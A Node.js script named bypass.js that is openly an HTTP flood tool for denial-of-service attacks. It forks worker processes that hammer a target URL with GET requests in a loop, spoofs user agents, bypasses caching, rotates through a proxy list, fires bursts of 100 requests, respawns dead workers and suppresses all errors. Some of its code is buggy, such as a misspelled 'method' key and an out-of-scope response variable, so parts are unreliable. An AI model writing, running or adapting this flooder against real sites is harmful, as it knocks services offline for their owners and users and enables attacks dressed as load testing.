require('events').EventEmitter.defaultMaxListeners = 0;

const request = require('request')

const fakeUa = require('fake-useragent')

const fs = require('fs')

const cluster = require('cluster')

async function mainprocess(){

  

    if (process.argv.length != 6){

        console.log("USAGE : node bypass.js url thread time raw/proxy")

       

        console.log(`

        ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄     

        ▐  ▄▀   ▐ ▐  ▄▀   ▐ █ █   ▐     

          █▄▄▄▄▄    █▄▄▄▄▄     ▀▄       

          █    ▌    █    ▌  ▀▄   █      

         ▄▀▄▄▄▄    ▄▀▄▄▄▄    █▀▀▀       

         █    ▐    █    ▐    ▐          

         ▐         ▐                    

    `)

    console.log("EXEMP: node bypass.js https://google.com 10 1000 raw/proxy")

        process.exit()

    

    }

    

    else{

        

        if (process.argv[5]=='raw'){

            console.log('ATTACK RAW')

        }

  

        else{
         
            console.log("ATTACK PROXY")

        }

        function run(){

            if (process.argv[5] == 'raw'){

                

                var http={

                    url:process.argv[2],

                    medthod:'get',

                    headers:{

                        'user-agent':fakeUa(),

                        'Cache-Control': 'no-cache'

                    }

                }

                request(http,function(e,r){

                    console.log("ATTACK TO ",process.argv[2],'STATUS CODE',r.statusCode,r.statusMessage)

                })

                if (r.statusCode > 226){

                    request(http)

                }

            }

            else if(process.argv[5] == process.argv[5]){

                

                var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n'); 
                if (proxies.length == 0){
                process.exit(0)}

                var proxy = proxies[Math.floor(Math.random()* proxies.length)]

                proxyrequests = request.defaults({'proxy':'http://'+proxy})

                var config={

                    url:process.argv[2],

                    medthod:'get',

                    headers:{

                        'user-agent':fakeUa(),

                        'Cache-Control': 'no-cache'

                    }

                }

                proxyrequests(config,function(e,r){

                    console.log('STATUS CODE',r.statusCode,r.statusMessage)

                })
                if (r.statusCode >= 200 && r.statusCode <= 226 ){

                  for (let i=0;i<100;i++){

                    proxyrequests(config)

                  }

                

                }

               

                

            }

            

            

        }

    }

    function thread(){

        setInterval(()=>{

            run()

        })

    }

    async function main(){

    if (cluster.isMaster){

        for (let i=0;i<process.argv[3];i++){

            cluster.fork()

            console.log("CREAT BY EES !! ")

            

            

            

        }

    cluster.on("exit",function(){

        cluster.fork()

    })

    }

    else{

        thread()

    }

    }

main()    

   

}

process.on('uncaughtException', function (err) {

});

process.on('unhandledRejection', function (err) {

});

setTimeout(()=>{

    console.log("ATTACK TIME OUT !!!")

    process.exit()

},process.argv[4] * 1000)

mainprocess()

